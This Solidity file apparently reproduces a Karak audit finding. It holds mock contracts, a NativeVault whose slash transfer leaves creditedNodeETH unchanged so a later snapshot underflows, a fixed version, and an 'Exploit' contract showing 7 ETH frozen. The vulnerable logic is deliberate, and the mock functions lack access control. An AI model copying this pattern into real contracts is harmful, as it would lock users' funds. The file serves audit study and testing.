// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Karak — _transferToSlashStore moves slash ETH and leaves creditedNodeETH
    unchanged (Pashov, June 2024). _startSnapshot then underflows on
    balance - creditedNodeETH. A 3 ETH slash leaves 7 ETH in the node against
    8 ETH of credit. withdrawRemaining calls the snapshot first, so the 7 ETH
    cannot leave. The fixed slash decreases creditedNodeETH and the snapshot
    returns the 2 ETH of unattributed balance. */

contract Eth {
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    address public minter;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Node {
    Eth public eth;

    constructor(Eth _eth) {
        eth = _eth;
    }

    function withdraw(address to, uint256 amount) external {
        eth.transfer(to, amount);
    }
}

contract SlashStore {
    Eth public eth;

    constructor(Eth _eth) {
        eth = _eth;
    }
}

contract NativeVault {
    Eth public eth;
    Node public node;
    SlashStore public slashStore;
    uint256 public creditedNodeETH;

    constructor(Eth _eth, Node _node, SlashStore _store) {
        eth = _eth;
        node = _node;
        slashStore = _store;
    }

    function credit(uint256 amount) external {
        creditedNodeETH = amount;
    }

    function transferToSlashStore(uint256 amount) external {
        node.withdraw(address(slashStore), amount); // @> VULN: creditedNodeETH is not decreased by the slash
    }

    function startSnapshot() external returns (uint256 nodeBalanceWei) {
        nodeBalanceWei = eth.balanceOf(address(node)) - creditedNodeETH;
    }

    function withdrawRemaining(address to) external {
        this.startSnapshot();
        node.withdraw(to, eth.balanceOf(address(node)));
    }
}

contract NativeVaultFixed {
    Eth public eth;
    Node public node;
    SlashStore public slashStore;
    uint256 public creditedNodeETH;

    constructor(Eth _eth, Node _node, SlashStore _store) {
        eth = _eth;
        node = _node;
        slashStore = _store;
    }

    function credit(uint256 amount) external {
        creditedNodeETH = amount;
    }

    function transferToSlashStore(uint256 amount) external {
        node.withdraw(address(slashStore), amount);
        creditedNodeETH -= amount;
    }

    function startSnapshot() external returns (uint256 nodeBalanceWei) {
        nodeBalanceWei = eth.balanceOf(address(node)) - creditedNodeETH;
    }
}

contract Exploit {
    Eth public eth; // nonce 1
    Node public node; // nonce 2
    SlashStore public slashStore; // nonce 3
    NativeVault public vault; // nonce 4
    bool public withdrawReverted;

    constructor() {
        eth = new Eth();
        node = new Node(eth);
        slashStore = new SlashStore(eth);
        vault = new NativeVault(eth, node, slashStore);
    }

    function run() external {
        eth.mint(address(node), 10 ether);
        vault.credit(8 ether);
        vault.transferToSlashStore(3 ether);
        require(eth.balanceOf(address(slashStore)) == 3 ether, "slash store 3");
        require(eth.balanceOf(address(node)) == 7 ether, "node 7");
        require(vault.creditedNodeETH() == 8 ether, "credited stuck");
        try vault.withdrawRemaining(address(this)) {
            withdrawReverted = false;
        } catch {
            withdrawReverted = true;
        }
        require(withdrawReverted, "withdraw must revert");
        require(eth.balanceOf(address(node)) == 7 ether, "7 ETH frozen");
        require(vault.creditedNodeETH() > eth.balanceOf(address(node)), "short");
        require(vault.creditedNodeETH() - eth.balanceOf(address(node)) == 1 ether, "short 1");
    }
}
